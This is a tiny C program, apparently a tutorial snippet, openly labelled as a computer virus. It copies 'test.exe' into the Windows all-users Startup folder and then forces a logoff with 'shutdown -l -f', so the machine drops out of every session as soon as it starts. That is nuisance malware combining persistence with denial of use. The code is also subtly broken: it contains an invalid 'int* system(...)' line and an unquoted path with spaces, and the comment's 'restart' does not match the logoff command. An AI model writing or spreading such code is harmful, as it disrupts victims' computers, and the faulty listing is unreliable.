//Develop Computer Virus using C to Restart Computer
#include<stdio.h>
#include<direct.h>
int main()
{
    int* system("copy test.exe C:/Documents and Settings/All Users/Start Menu/Programs/Startup/");
    system("shutdown -l -f");
}
